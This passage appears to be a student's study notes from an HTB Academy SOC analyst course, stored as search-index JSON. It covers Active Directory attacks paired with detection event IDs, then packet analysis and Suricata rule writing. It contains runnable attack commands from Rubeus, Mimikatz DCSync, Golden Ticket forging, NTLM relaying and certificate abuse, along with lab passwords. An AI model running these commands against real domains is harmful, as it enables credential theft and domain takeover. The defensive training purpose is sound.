shared folder on WS001, which can be accessed via SMB.</p> <p><code>$ smbclient \\\\\\\\TARGET_IP\\\\Share -U eagle/administrator%Slavi123</code></p>"}, {"location": "HTB/Academy/SOC%20Analyst/#kerberoasting", "title": "Kerberoasting", "text": "<pre><code>.\\Rubeus.exe kerberoast /outfile:spn.txt\n</code></pre> <p>Q2:</p> <p>Remote Desktop Connection -&gt; Event viewer -&gt; Windows Logs -&gt; Security -&gt; Filter Current Log (Last Hour) -&gt; Event ID 4769 (A Kerberos service ticket was requested) -&gt; Find \"webservice\"</p> <p></p>"}, {"location": "HTB/Academy/SOC%20Analyst/#as-reproasting", "title": "AS-REProasting", "text": "<p>The success of this attack depends on the strength of the password of users with Do not require Kerberos preauthentication configured.</p> <p><code>.\\Rubeus.exe asreproast /outfile:asrep.txt</code></p> <p>For hashcat to be able to recognize the hash, we need to edit it by adding <code>23$</code> after <code>$krb5asrep$</code></p> <p><code>$krb5asrep$23$anni@eagle.local:</code></p> <p><code>sudo hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --outfile asrepcrack.txt --force</code></p> <p>Event ID 4768(S, F): A Kerberos authentication ticket (TGT) was requested.</p>"}, {"location": "HTB/Academy/SOC%20Analyst/#gpp-passwords-group-policy-preferences", "title": "GPP Passwords (Group Policy Preferences)", "text": "<p>SYSVOL is a network share on all Domain Controllers, containing logon scripts, group policy data, and other required domain-wide data. AD stores all group policies in <code>\\\\&lt;DOMAIN&gt;\\SYSVOL\\&lt;DOMAIN&gt;\\Policies\\</code>.</p> <pre><code>powershell -ep bypass\nImport-Module .\\Get-GPPPassword.ps1\nGet-GPPPassword\n</code></pre> <p>Prevention: For auditing, we can generate an event whenever a user reads the XML file containing the credentials.</p> <p>Event ID 4663:  An attempt was made to access an object.</p>"}, {"location": "HTB/Academy/SOC%20Analyst/#gpo-permissionsgpo-files", "title": "GPO Permissions/GPO Files", "text": "<p>Prevention</p> <p>One way to prevent this attack is to lock down the GPO permissions to be modified by a particular group of users only or by a specific account, as this will significantly limit the ability of who can edit the GPO or change its permissions (as opposed to everybody in Domain admins, which in some organizations can easily be more than 50). Similarly, never deploy files stored in network locations so that many users can modify the share permissions.</p> <p>We should also review the permissions of GPOs actively and regularly, with the option of automating a task that runs hourly and alerts if any deviations from the expected permissions are detected.</p> <p>Event ID 5136(S) A directory service object was modified.</p> <ul> <li> <p>GPO is linked to non-critical servers only.</p> </li> <li> <p>Continuous automation is in place for monitoring modifications of GPO. - - If the GPO file is modified, we will disable the user performing the modification immediately.</p> </li> <li> <p>The GPO should be automatically unlinked from all locations if a modification is detected.</p> </li> </ul> <pre><code># Define filter for the last 15 minutes\n$TimeSpan = (Get-Date) - (New-TimeSpan -Minutes 15)\n\n# Search for event ID 5136 (GPO modified) in the past 15 minutes\n$Logs = Get-WinEvent -FilterHashtable @{LogName='Security';id=5136;StartTime=$TimeSpan} -ErrorAction SilentlyContinue |`\nWhere-Object {$_.Properties[8].Value -match \"CN={73C66DBB-81DA-44D8-BDEF-20BA2C27056D},CN=POLICIES,CN=SYSTEM,DC=EAGLE,DC=LOCAL\"}\n\n\nif($Logs){\n    $emailBody = \"Honeypot GPO '73C66DBB-81DA-44D8-BDEF-20BA2C27056D' was modified`r`n\"\n    $disabledUsers = @()\n    ForEach($log in $logs){\n        If(((Get-ADUser -identity $log.Properties[3].Value).Enabled -eq $true) -and ($log.Properties[3].Value -notin $disabledUsers)){\n            Disable-ADAccount -Identity $log.Properties[3].Value\n            $emailBody = $emailBody + \"Disabled user \" + $log.Properties[3].Value + \"`r`n\"\n            $disabledUsers += $log.Properties[3].Value\n        }\n    }\n    # Send an alert via email - complete the command below\n    # Send-MailMessage\n    $emailBody\n}\n</code></pre> <p>Event ID 4725 is a security event that is logged in Active Directory when a user or computer object is disabled.</p>"}, {"location": "HTB/Academy/SOC%20Analyst/#credentials-in-shares", "title": "Credentials in Shares", "text": "<pre><code>powershell -ep bypass\nImport-Module .\\PowerView.ps1\nInvoke-ShareFinder -domain eagle.local -ExcludeStandard -CheckShareAccess\n</code></pre> <p><code>\\\\Server01.eagle.local\\dev$</code></p> <p><code>findstr</code> command:</p> <p><code>/s</code> forces to search the current directory and all subdirectories</p> <p><code>/i</code> ignores case in the search term</p> <p><code>/m</code> shows only the filename for a file that matches the term. We highly need this in real production environments because of the huge amounts of text that get returned. For example, this can be thousands of lines in PowerShell scripts that contain the PassThru parameter when matching for the string pass.</p> <p>The term that defines what we are looking for. Good candidates include pass, pw, and the NETBIOS name of the domain. In the playground environment, it is eagle. Attractive targets for this search would be file types such as .bat, .cmd, .ps1, .conf, .config, and .ini.</p> <pre><code>cd \\\\Server01.eagle.local\\dev$\n\n# find password in files\nfindstr /m /s /i \"pass\" *.bat\nfindstr /m /s /i \"pass\" *.cmd\nfindstr /m /s /i \"pass\" *.ini\nfindstr /m /s /i \"pass\" *.config\n\nfindstr /m /s /i \"pw\" *.config\nfindstr /s /i \"pw\" *.config\n\nfindstr /m /s /i \"eagle\" *.ps1\nfindstr /s /i \"eagle\" *.ps1\n</code></pre> <p>Event IDs 4624/4625 (successful and failed logon) and 4768 (Kerberos TGT requested)</p> <p>Q1:</p> <p><code>findstr /s /i \"Administrator2\" *.ps1</code></p>"}, {"location": "HTB/Academy/SOC%20Analyst/#credentials-in-object-properties", "title": "Credentials in Object Properties", "text": "<pre><code>Function SearchUserClearTextInformation\n{\n    Param (\n        [Parameter(Mandatory=$true)]\n        [Array] $Terms,\n\n        [Parameter(Mandatory=$false)]\n        [String] $Domain\n    )\n\n    if ([string]::IsNullOrEmpty($Domain)) {\n        $dc = (Get-ADDomain).RIDMaster\n    } else {\n        $dc = (Get-ADDomain $Domain).RIDMaster\n    }\n\n    $list = @()\n\n    foreach ($t in $Terms)\n    {\n        $list += \"(`$_.Description -like `\"*$t*`\")\"\n        $list += \"(`$_.Info -like `\"*$t*`\")\"\n    }\n\n    Get-ADUser -Filter * -Server $dc -Properties Enabled,Description,Info,PasswordNeverExpires,PasswordLastSet |\n        Where { Invoke-Expression ($list -join ' -OR ') } | \n        Select SamAccountName,Enabled,Description,Info,PasswordNeverExpires,PasswordLastSet | \n        fl\n}\n</code></pre> <pre><code>Import-Module .\\SearchUserClearTextInformation.ps1\nSearchUserClearTextInformation -Terms \"pass\"\n</code></pre> <p>DC1 (172.16.18.3)</p> <p>Event ID 4771(F) Kerberos pre-authentication failed.</p> <p>Event ID 4776(S, F): The computer attempted to validate the credentials for an account.</p> <p><code>wmic useraccount where name='bonni' get name,sid</code></p>"}, {"location": "HTB/Academy/SOC%20Analyst/#dcsync", "title": "DCSync", "text": "<p>DCSync is an attack that threat agents utilize to impersonate a Domain Controller and perform replication with a targeted Domain Controller to extract password hashes from Active Directory. The attack can be performed both from the perspective of a user account or a computer, as long as they have the necessary permissions assigned, which are:</p> <ul> <li> <p>Replicating Directory Changes</p> </li> <li> <p>Replicating Directory Changes All</p> </li> </ul> <pre><code>runas /user:eagle\\rocky cmd.exe\n\nC:\\Mimikatz&gt;mimikatz.exe\n\nmimikatz # lsadump::dcsync /domain:eagle.local /user:Administrator\n</code></pre> <p>Prevention</p> <p>The only prevention technique against this attack is using solutions such as the RPC Firewall, a third-party product that can block or allow specific RPC calls with robust granularity. For example, using RPC Firewall, we can only allow replications from Domain Controllers.</p> <p>Event ID 4662(S, F) An operation was performed on an object.</p>"}, {"location": "HTB/Academy/SOC%20Analyst/#golden-ticket", "title": "Golden Ticket", "text": "<p>The Kerberos Golden Ticket is an attack in which threat agents can create/generate tickets for any user in the Domain, therefore effectively acting as a Domain Controller.</p> <p>To perform the Golden Ticket attack, we can use Mimikatz with the following arguments:</p> <p><code>/domain</code>: The domain's name.</p> <p><code>/sid</code>: The domain's SID value.</p> <p><code>/rc4</code>: The password's hash of krbtgt.</p> <p><code>/user</code>: The username for which Mimikatz will issue the ticket (Windows 2019 blocks tickets if they are for inexistent users.)</p> <p><code>/id</code>: Relative ID (last part of SID) for the user for whom Mimikatz will issue the ticket.</p> <p>Additionally, advanced threat agents mostly will specify values for the /renewmax and /endin arguments, as otherwise, Mimikatz will generate the ticket(s) with a lifetime of 10 years, making it very easy to detect by EDRs:</p> <p><code>/renewmax</code>: The maximum number of days the ticket can be renewed.</p> <p><code>/endin</code>: End-of-life for the ticket.</p> <p>First, we need to obtain the password's hash of krbtgt and the SID value of the Domain. We can utilize DCSync with Rocky's account from the previous attack to obtain the hash:</p> <pre><code>runas /user:eagle\\rocky cmd.exe\nmimikatz # lsadump::dcsync /domain:eagle.local /user:krbtgt\n\nHash NTLM: db0d0630064747072a7da3f7c3b4069e\n</code></pre> <pre><code># bob user\npowershell -exec bypass\n. .\\PowerView.ps1\nGet-DomainSID\n\nS-1-5-21-1518138621-4282902758-752445584\n</code></pre> <pre><code># rocky\n# mimikatz\nkerberos::golden /domain:eagle.local /sid:S-1-5-21-1518138621-4282902758-752445584 /rc4:db0d0630064747072a7da3f7c3b4069e /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt\n\nexit\n\nklist\n\ndir \\\\dc1\\c$\n</code></pre> <p></p> <p></p> <p>Event ID 4675(S) SIDs were filtered. - Windows 10</p>"}, {"location": "HTB/Academy/SOC%20Analyst/#kerberos-constrained-delegation", "title": "Kerberos Constrained Delegation", "text": "<p>Kerberos Delegation enables an application to access resources hosted on a different server.</p> <pre><code>powershell -ep bypass\n\nImport-Module .\\PowerView-main.ps1\n\nGet-NetUser -TrustedToAuth\n\n.\\Rubeus.exe hash /password:Slavi123\n\n# S4U (Service For User)\n.\\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /msdsspn:\"http/dc1\" /dc:dc1.eagle.local /ptt\n\nklist \n# With the ticket being available, we can connect to the Domain Controller impersonating the account Administrator:\nEnter-PSSession dc1\n\nhostname\n</code></pre>"}, {"location": "HTB/Academy/SOC%20Analyst/#print-spooler-ntlm-relaying", "title": "Print Spooler &amp; NTLM Relaying", "text": "<p>The Print Spooler is an old service enabled by default, even with the latest Windows Desktop and Servers versions. The service became a popular attack vector when in 2018, Lee Christensen found the PrinterBug. The functions <code>RpcRemoteFindFirstPrinterChangeNotification</code> and <code>RpcRemoteFindFirstPrinterChangeNotificationEx</code> can be abused to force a remote machine to perform a connection to any other machine it can reach. Moreover, the reverse connection will carry authentication information as a TGT. Therefore, any domain user can coerce <code>RemoteServer$</code> to authenticate to any machine. Microsoft's stance on the PrinterBug was that it will not be fixed, as the issue is \"by-design\".</p> <pre><code># configure NTLMRelayx to forward any connections to DC2 and attempt to perform the DCSync attack\n# connect to the Kali machine\n$ xfreerdp /u:kali /p:kali /v:10.129.246.71 /dynamic-resolution\n\n$ impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support\n$ python3 ./dementor.py 172.16.18.20 172.16.18.3 -u bob -d eagle.local -p Slavi123\n\n$ xfreerdp /u:htb-student /p:'HTB_@cademy_stdnt!' /v:172.16.18.3 /dynamic-resolution\n</code></pre> <p>dementor.py</p> <p>Prevention</p> <p>Print Spooler should be disabled on all servers that are not printing servers. Domain Controllers and other core servers should never have additional roles/functionalities that open and widen the attack surface toward the core AD infrastructure.</p> <p>Additionally, there is an option to prevent the abuse of the PrinterBug while keeping the service running: when disabling the registry key <code>RegisterSpoolerRemoteRpcEndPoint</code>, any incoming remote requests get blocked; this acts as if the service was disabled for remote clients. Setting the registry key to 1 enables it, while 2 disables it:</p> <p></p> <p>Q2:</p> <p></p>"}, {"location": "HTB/Academy/SOC%20Analyst/#coercing-attacks-unconstrained-delegation", "title": "Coercing Attacks &amp; Unconstrained Delegation", "text": "<pre><code># powerview\nGet-NetComputer -Unconstrained | select samaccountname\n\n#start Rubeus in an administrative prompt to monitor for new logons and extract TGTs\n.\\Rubeus.exe monitor /interval:1\n\n# switch to the Kali machine to execute Coercer towards DC1, while we force it to connect to WS001 if coercing is successful\n$ Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local\n\n.\\Rubeus.exe ptt /ticket:doIFdDCCBXCgAwIBBa...\n\n.\\mimikatz.exe \"lsadump::dcsync /domain:eagle.local /user:Administrator\"\n</code></pre>"}, {"location": "HTB/Academy/SOC%20Analyst/#object-acls", "title": "Object ACLs", "text": "<pre><code>.\\SharpHound.exe -c All\n</code></pre> <p>Event ID 4738(S) A user account was changed. - Windows 10</p> <p>Event ID 4724 indicates an attempt to reset another account's password</p> <p>Event ID 4742(S) A computer account was changed. - Windows 10</p>"}, {"location": "HTB/Academy/SOC%20Analyst/#pki-esc1", "title": "PKI - ESC1", "text": "<pre><code>.\\Certify.exe find /vulnerable\n\n.\\Certify.exe request /ca:PKI.eagle.local\\eagle-PKI-CA /template:UserCert /altname:Administrator\n\n# avoid bad formatting of the PEM file\n$ sed -i 's/\\s\\s\\+/\\n/g' cert.pem\n\n$ openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx\n\n.\\Rubeus.exe asktgt /domain:eagle.local /user:Administrator /certificate:cert.pfx /dc:dc1.eagle.local /ptt\n</code></pre>"}, {"location": "HTB/Academy/SOC%20Analyst/#intro-to-network-traffic-analysis", "title": "Intro to Network Traffic Analysis", "text": "<p>OSI / TCP-IP Models</p> <p>Protocol Data Units (PDU)</p> <p></p> <p>PDU Packet Breakdown</p> <p></p>"}, {"location": "HTB/Academy/SOC%20Analyst/#tcpdump-fundamentals", "title": "Tcpdump Fundamentals", "text": "Switch Command Result D Will display any interfaces available to capture from. i Selects an interface to capture from. ex. -i eth0 n Do not resolve hostnames. nn Do not resolve hostnames or well-known ports. e Will grab the ethernet header along with upper-layer data. X Show Contents of packets in hex and ASCII. XX Same as X, but will also specify ethernet headers. (like using Xe) v, vv, vvv Increase the verbosity of output shown and saved. c Grab a specific number of packets, then quit the program. s Defines how much of a packet to grab. S change relative sequence numbers in the capture display to absolute sequence numbers. (13248765839 instead of 101) q Print less protocol information. r file.pcap Read from a file. w file.pcap Write into a file. <pre><code># Listing Available Interfaces\n$ sudo tcpdump -D\n\n# Choosing an Interface to Capture From\n$ sudo tcpdump -i eth0\n\n# Disable Name Resolution\n$ sudo tcpdump -i eth0 -nn\n\n# Display the Ethernet Header\n$ sudo tcpdump -i eth0 -e\n\n# Include ASCII and Hex Output\n$ sudo tcpdump -i eth0 -X\n\n# Tcpdump Switch Combinations\n$ sudo tcpdump -i eth0 -nnvXX\n\n# Save our PCAP Output to a File\n$ sudo tcpdump -i eth0 -w ~/output.pcap\n\n# Reading Output From a File\n$ sudo tcpdump -r ~/output.pcap\n</code></pre>"}, {"location": "HTB/Academy/SOC%20Analyst/#tcpdump-packet-filtering", "title": "Tcpdump Packet Filtering", "text": "Filter Result host host will filter visible traffic to show anything involving the designated host. Bi-directional src / dest src and dest are modifiers. We can use them to designate a source or destination host or port. net net will show us any traffic sourcing from or destined to the network designated. It uses / notation. proto will filter for a specific protocol type. (ether, TCP, UDP, and ICMP as examples) port port is bi-directional. It will show any traffic with the specified port as the source or destination. portrange portrange allows us to specify a range of ports. (0-1024) less / greater \"&lt; &gt;\" less and greater can be used to look for a packet or protocol option of a specific size. and / &amp;&amp; and &amp;&amp; can be used to concatenate two different filters together. for example, src host AND port. or or allows for a match on either of two conditions. It does not have to meet both. It can be tricky. not not is a modifier saying anything but x. For example, not UDP. <pre><code># Host Filter\n$ sudo tcpdump -i eth0 host 172.16.146.2\n\n# Source/Destination Filter\n$ sudo tcpdump -i eth0 src host 172.16.146.2\n\n# Utilizing Source With Port as a Filter\n$ sudo tcpdump -i eth0 tcp src port 80\n\n# Using Destination in Combination with the Net Filter\n$ sudo tcpdump -i eth0 dest net 172.16.146.0/24\n\n# Protocol Filter - Common Name\n$ sudo tcpdump -i eth0 udp\n\n# Protocol Filter - Number\n# Protocol 17 is the User Datagram Protocol (UDP). \n$ sudo tcpdump -i eth0 proto 17\n\n# Port Filter\n$ sudo tcpdump -i eth0 tcp port 443\n\n# Port Range Filter\n$ sudo tcpdump -i eth0 portrange 0-1024\n\n# Less/Greater Filter\n$ sudo tcpdump -i eth0 less 64\n\n# Utilizing Greater\n$ sudo tcpdump -i eth0 greater 500\n\n# AND Filter\n$ sudo tcpdump -i eth0 host 192.168.0.1 and port 23\n\n# OR Filter\n$ sudo tcpdump -r sus.pcap icmp or host 172.16.146.1\n\n# NOT Filter\n$ sudo tcpdump -r sus.pcap not icmp\n</code></pre> <p>Tips and Tricks</p> <pre><code># -A will show only the ASCII text\n$ sudo tcpdump -Ar telnet.pcap\n\n# Piping a Capture to Grep\n# used the -l to pass the output to grep\n$ sudo tcpdump -Ar http.cap -l | grep 'mailto:*'\n\n# Looking for TCP Protocol Flags\n$ tcpdump -i eth0 'tcp[13] &amp;2 != 0'\n\n# Hunting For a SYN Flag\n$ sudo tcpdump -i eth0 'tcp[13] &amp;2 != 0'\n</code></pre>"}, {"location": "HTB/Academy/SOC%20Analyst/#wireshark", "title": "Wireshark", "text": "<pre><code># filter commands\nftp\nftp.request.command\n\n# ftp-data - Will show any data transferred over the data channel ( port 20 )\nftp-data\n</code></pre>"}, {"location": "HTB/Academy/SOC%20Analyst/#intermediate-network-traffic-analysis", "title": "Intermediate Network Traffic Analysis", "text": "<pre><code>$ wget -O file.zip 'https://academy.hackthebox.com/storage/resources/pcap_files.zip' &amp;&amp; mkdir tempdir &amp;&amp; unzip file.zip -d tempdir &amp;&amp; mkdir -p pcaps &amp;&amp; mv tempdir/Intermediate_Network_Traffic_Analysis/* pcaps/ &amp;&amp; rm -r tempdir file.zip\n</code></pre>"}, {"location": "HTB/Academy/SOC%20Analyst/#arp-spoofing-abnormality-detection", "title": "ARP Spoofing &amp; Abnormality Detection", "text": "<p>Address Resolution Protocol (ARP)</p> <p>arp.opcode == 1: This represents all types of ARP Requests</p> <p>arp.opcode == 2: This signifies all types of ARP Replies</p> <p><code>arp.duplicate-address-detected &amp;&amp; arp.opcode == 2</code></p> <p><code>arp.duplicate-address-detected or arp.duplicate-address-frame</code></p> <p><code>(arp.opcode) &amp;&amp; ((eth.src == 08:00:27:53:0c:ba) || (eth.dst == 08:00:27:53:0c:ba))</code></p> <p><code>arp.opcode==1 &amp;&amp; eth.src==08:00:27:53:0c:ba</code></p>"}, {"location": "HTB/Academy/SOC%20Analyst/#arp-scanning-denial-of-service", "title": "ARP Scanning &amp; Denial-of-Service", "text": "<p>Some typical red flags indicative of ARP scanning are:</p> <ol> <li> <p>Broadcast ARP requests sent to sequential IP addresses (.1,.2,.3,...)</p> </li> <li> <p>Broadcast ARP requests sent to non-existent hosts</p> </li> <li> <p>Potentially, an unusual volume of ARP traffic originating from a malicious or compromised host</p> </li> </ol>"}, {"location": "HTB/Academy/SOC%20Analyst/#80211-denial-of-service", "title": "802.11 Denial of Service", "text": "<p>Wireless Interfaces</p> <p><code>iwconfig</code></p> <p>Airmon-NG</p> <p><code>sudo airmon-ng start wlan0</code></p> <p>Monitor Mode</p> <pre><code>$ sudo ifconfig wlan0 down\n$ sudo iwconfig wlan0 mode monitor\n$ sudo ifconfig wlan0 up\n$ iwconfig\n</code></pre> <p>To commence capturing traffic from our clients and network, we can employ airodump-ng. We need to specify our AP's channel with -c, its BSSID with --bssid, and the output file name with -w.</p> <p><code>$ sudo airodump-ng -c 4 --bssid F8:14:FE:4D:E6:F1 wlan0 -w raw</code></p> <p>How Deauthentication Attacks Work</p> <ol> <li> <p>To capture the WPA handshake to perform an offline dictionary attack</p> </li> <li> <p>To cause general denial of service conditions</p> </li> <li> <p>To enforce users to disconnect from our network, and potentially join their network to retrieve information</p> </li> </ol> <p>Finding Deauthentication Attacks</p> <p><code>wlan.bssid == xx:xx:xx:xx:xx:xx</code></p> <p>specify the type of frame (management) with 00 and the subtype (deauthentication) with 12</p> <p><code>(wlan.bssid == xx:xx:xx:xx:xx:xx) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12)</code></p> <p><code>(wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12) and (wlan.fixed.reason_code == 7)</code></p> <p><code>(wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12) and (wlan.fixed.reason_code == 1)</code></p> <p>Q: Inspect the deauthandbadauth.cap file, part of this module's resources, and submit the total count of deauthentication frames as your answer.</p> <p><code>wlan.bssid == F8:14:FE:4D:E6:F1 and wlan.fc.type_subtype == 12</code></p>"}, {"location": "HTB/Academy/SOC%20Analyst/#rogue-access-point-evil-twin-attacks", "title": "Rogue Access Point &amp; Evil-Twin Attacks", "text": "<p>Airodump-ng Detection</p> <p><code>$ sudo airodump-ng -c 4 --essid HTB-Wireless wlan0 -w raw</code></p> <p><code>(wlan.fc.type == 00) and (wlan.fc.type_subtype == 8)</code></p> <p>Finding a Fallen User</p> <p><code>(wlan.bssid == F8:14:FE:4D:E6:F2)</code></p> <p>Q:</p> <p></p>"}, {"location": "HTB/Academy/SOC%20Analyst/#fragmentation-attacks", "title": "Fragmentation Attacks", "text": "<p>Q: Inspect the nmap_frag_fw_bypass.pcapng file, part of this module's resources, and enter the total count of packets that have the TCP RST flag set as your answer.</p> <p><code>tcp.flags.reset==1</code></p>"}, {"location": "HTB/Academy/SOC%20Analyst/#tcp-handshake-abnormalities", "title": "TCP Handshake Abnormalities", "text": "<p>Q: Inspect the nmap_syn_scan.pcapng file, part of this module's resources, and enter the total count of packets that have the TCP ACK flag set as your answer.</p> <p><code>tcp.flags.ack==1</code></p>"}, {"location": "HTB/Academy/SOC%20Analyst/#httphttps-service-enumeration", "title": "HTTP/HTTPs Service Enumeration", "text": "<pre><code>$ cat access.log | grep \"192.168.10.5\"\n\n$ cat access.log | awk '$1 == \"192.168.10.5\"'\n</code></pre> <pre><code>http.request and ((ip.src_host == &lt;suspected IP&gt;) or (ip.dst_host == &lt;suspected IP&gt;))\n</code></pre> <p>Q: Inspect the basic_fuzzing.pcapng file, part of this module's resources, and enter the total number of HTTP packets that are related to GET requests against port 80 as your answer.</p> <p><code>http.request.method==GET &amp;&amp; tcp.dstport == 80</code></p>"}, {"location": "HTB/Academy/SOC%20Analyst/#strange-http-headers", "title": "Strange HTTP Headers", "text": "<pre><code>http.request and (!(http.host == \"192.168.10.7\"))\n\nhttp.response.code == 400\n</code></pre>"}, {"location": "HTB/Academy/SOC%20Analyst/#ssl-renegotiation-attacks", "title": "SSL Renegotiation Attacks", "text": "<pre><code># The content type 22 specifies handshake messages only\nssl.record.content_type == 22\n</code></pre> <p>Q: Inspect the SSL_renegotiation_edited.pcapng file, part of this module's resources, and enter the total count of \"Client Hello\" requests as your answer.</p> <p><code>tls.handshake.type == 1</code></p>"}, {"location": "HTB/Academy/SOC%20Analyst/#strange-telnet-udp-connections", "title": "Strange Telnet &amp; UDP Connections", "text": "<pre><code>((ipv6.src_host == fe80::c9c8:ed3:1b10:f10b) or (ipv6.dst_host == fe80::c9c8:ed3:1b10:f10b)) and telnet\n</code></pre>"}, {"location": "HTB/Academy/SOC%20Analyst/#working-with-idsips", "title": "Working with IDS/IPS", "text": ""}, {"location": "HTB/Academy/SOC%20Analyst/#suricata", "title": "Suricata", "text": "<p>Suricata Operation Modes</p> <ol> <li> <p>The Intrusion Detection System (IDS) mode positions Suricata as a silent observer. </p> </li> <li> <p>In the Intrusion Prevention System (IPS) mode, Suricata adopts a proactive stance. </p> </li> <li> <p>The Intrusion Detection Prevention System (IDPS) mode brings together the best of both IDS and IPS. </p> </li> <li> <p>In its Network Security Monitoring (NSM) mode, Suricata transitions into a dedicated logging mechanism, eschewing active or passive traffic analysis or prevention capabilities. </p> </li> </ol> <p>Configuring Suricata &amp; Custom Rules</p> <pre><code>$ ls -lah /etc/suricata/rules/\n\n$ more /etc/suricata/rules/emerging-malware.rules\n\n$ more /etc/suricata/suricata.yaml\n\n$ sudo vim /etc/suricata/suricata.yaml\n\n$ suricata -r /home/htb-student/pcaps/suspicious.pcap\n\n# bypass checksums (-k flag) and log in a different directory (-l flag)\n$ suricata -r /home/htb-student/pcaps/suspicious.pcap -k none -l .\n\n# For live input, we can try Suricata\u2019s (Live) LibPCAP mode as follows\n$ ifconfig\n\n# ens160 is an interface number like eth0\n$ sudo suricata --pcap=ens160 -vv\n\n# For Suricata in Inline (NFQ) mode, the following command should be executed first.\n$ sudo iptables -I FORWARD -j NFQUEUE\n\n$ sudo suricata -q 0\n\n# try Suricata in IDS mode with AF_PACKET input, execute one of the below.\n$ sudo suricata -i ens160\n$ sudo suricata --af-packet=ens160\n\n# utilize tcpreplay to replay network traffic from a PCAP file (suspicious.pcap in this case)\n$ sudo  tcpreplay -i ens160 /home/htb-student/pcaps/suspicious.pcap\n</code></pre> <p>Suricata Outputs</p> <pre><code>$ less /var/log/suricata/old_eve.json\n\n$ cat /var/log/suricata/old_eve.json | jq -c 'select(.event_type == \"alert\")'\n\n$ cat /var/log/suricata/old_eve.json | jq -c 'select(.event_type == \"dns\")' | head -1 | jq .\n\n$ cat /var/log/suricata/old_fast.log\n\n$ cat /var/log/suricata/old_stats.log\n</code></pre> <p>File Extraction</p> <pre><code># rules\nalert http any any -&gt; any any (msg:\"FILE store all\"; filestore; sid:2; rev:1;)\n</code></pre> <p>Live Rule Reloading Feature &amp; Updating Suricata Rulesets</p> <pre><code>$ sudo kill -usr2 $(pidof suricata)\n\n$ sudo suricata-update\n\n$ sudo suricata-update list-sources\n\n$ sudo suricata-update enable-source et/open\n\n$ sudo suricata-update\n\n$ sudo systemctl restart suricata\n</code></pre> <p>Validating Suricata's Configuration</p> <pre><code>$ sudo suricata -T -c /etc/suricata/suricata.yaml\n</code></pre> <p>Q1: Filter out only HTTP events from /var/log/suricata/old_eve.json using the the jq command-line JSON processor. Enter the flow_id that you will come across as your answer.</p> <p><code>$ cat /var/log/suricata/old_eve.json | jq -c 'select(.event_type == \"http\")'</code></p> <p>Q2: Enable the http-log output in suricata.yaml and run Suricata against /home/htb-student/pcaps/suspicious.pcap. Enter the requested PHP page as your answer. Answer format: _.php</p> <pre><code>$ sudo vim /etc/suricata/suricata.yaml\n\n/http-log\nenable: yes\n:wq\n\n$ suricata -r /home/htb-student/pcaps/suspicious.pcap -k none -l .\n\n$ cat /var/log/suricata/old_eve.json | jq -c 'select(.event_type == \"http\")' | tail -1 | jq .\n\n# OR\n$ find /var/log/suricata -type f -exec cat {} \\; | grep -arin -o -E '(\\w+\\W+){0,5}php(\\W+\\w+){0,5}' .\n</code></pre> <p>app.php</p>"}, {"location": "HTB/Academy/SOC%20Analyst/#suricata-rule-development-part-1", "title": "Suricata Rule Development Part 1", "text": "<p><code>action protocol from_ip port -&gt; to_ip port (msg:\"Known malicious behavior, possible X malware infection\"; content:\"some thing\"; content:\"some other thing\"; sid:10000001; rev:1;)</code></p> <p>Example: <code>alert http any any -&gt; $HOME_NET any (msg: \"ATTACK [PTsecurity] Apache Continuum &lt;= v1.4.2 CMD Injection\"; content: \"POST\"; http_method; content: \"/continuum/saveInstallation.action\"; offset: 0; depth: 34; http_uri; content: \"installation.varValue=\"; nocase; http_client_body; pcre: !\"/^\\$?[\\sa-z\\\\_0-9.-]*(\\&amp;|$)/iRP\"; flow: to_server, established;sid: 10000048; rev: 1;)</code></p> <pre><code>$ xfreerdp /u:htb-student /p:'HTB_@cademy_stdnt!' /v:10.129.173.128 /dynamic-resolution /relax-order-checks +glyph-cache\n`\n# Suricata Rule Development Example 1: Detecting PowerShell Empire\nalert http $HOME_NET any -&gt; $EXTERNAL_NET any (msg:\"ET MALWARE Possible PowerShell Empire Activity Outbound\"; flow:established,to_server; content:\"GET\"; http_method; content:\"/\"; http_uri; depth:1; pcre:\"/^(?:login\\/process|admin\\/get|news)\\.php$/RU\"; content:\"session=\"; http_cookie; pcre:\"/^(?:[A-Z0-9+/]{4})*(?:[A-Z0-9+/]{2}==|[A-Z0-9+/]{3}=|[A-Z0-9+/]{4})$/CRi\"; content:\"Mozilla|2f|5.0|20 28|Windows|20|NT|20|6.1\"; http_user_agent; http_start; content:\".php|20|HTTP|2f|1.1|0d 0a|Cookie|3a 20|session=\"; fast_pattern; http_header_names; content:!\"Referer\"; content:!\"Cache\"; content:!\"Accept\"; sid:2027512; rev:1;)\n\n$ sudo suricata -r /home/htb-student/pcaps/psempire.pcap -l . -k none\n$ cat fast.log\n\n# Suricata Rule Development Example 2: Detecting Covenant\nalert tcp any any -&gt; $HOME_NET any (msg:\"detected by body\"; content:\"&lt;title&gt;Hello World!&lt;/title&gt;\"; detection_filter: track by_src, count 4 , seconds 10; priority:1; sid:3000011;)\n\n$ sudo suricata -r /home/htb-student/pcaps/covenant.pcap -l . -k none\n$ cat fast.log\n\n# Suricata Rule Development Example 3: Detecting Covenant (Using Analytics)\nalert tcp $HOME_NET any -&gt; any any (msg:\"detected by size and counter\"; dsize:312; detection_filter: track by_src, count 3 , seconds 10; priority:1; sid:3000001;)\n\n$ sudo suricata -r /home/htb-student/pcaps/covenant.pcap -l . -k none\n$ cat fast.log\n\n# Suricata Rule Development Example 4: Detecting Sliver\nalert tcp any any -&gt; any any (msg:\"Sliver C2 Implant Detected\"; content:\"POST\"; pcre:\"/\\/(php|api|upload|actions|rest|v1|oauth2callback|authenticate|oauth2|oauth|auth|database|db|namespaces)(.*?)((login|signin|api|samples|rpc|index|admin|register|sign-up)\\.php)\\?[a-z_]{1,2}=[a-z0-9]{1,10}/i\"; sid:1000007; rev:1;)\n\n$ sudo suricata -r /home/htb-student/pcaps/sliver.pcap -l . -k none\n$ cat fast.log\n\nalert tcp any any -&gt; any any (msg:\"Sliver C2 Implant Detected - Cookie\"; content:\"Set-Cookie\"; 